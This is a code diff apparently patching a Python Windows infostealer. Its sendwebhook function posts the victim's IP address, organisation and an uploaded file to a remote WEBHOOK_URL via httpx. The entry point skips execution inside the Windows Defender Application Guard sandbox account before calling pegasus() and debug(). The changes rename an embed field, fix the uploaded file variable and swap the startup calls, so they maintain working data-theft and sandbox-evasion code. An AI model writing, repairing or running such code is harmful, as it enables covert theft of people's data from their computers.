@@ -2,7 +2,9 @@ import base64
 import difflib
 import json
 import os
+import subprocess
 import sys
+import time
 import winreg
 from base64 import b64decode
 from json import load, loads
@@ -15,6 +17,7 @@ from threading import Thread
 from time import localtime, strftime
 from urllib.request import urlopen
 from zipfile import ZipFile
+import httpx
 
 import psutil
 import requests
@@ -388,7 +391,7 @@ def sendwebhook(self):
                     },
                 'fields': [
                     {
-                        'name': 'Account',
+                        'name': 'Regional Info',
                         'value': f'''```fix
                                 IP:᠎ {ip}
                                 Org:᠎ {org}
@@ -429,7 +432,7 @@ def sendwebhook(self):
             ]
         }
     httpx.post(WEBHOOK_URL, json=embed)
-    httpx.post(WEBHOOK_URL, files={'upload_file': f})
+    httpx.post(WEBHOOK_URL, files={'upload_file': file})
 
 def cleanup():
     for clean in [
@@ -507,5 +510,5 @@ class debug:
 if __name__ == "__main__":
     if os.name == "nt":
         if os.getlogin != "WDAGUtilityAccount":
-            start()
-            init()
+            pegasus()
+            debug()
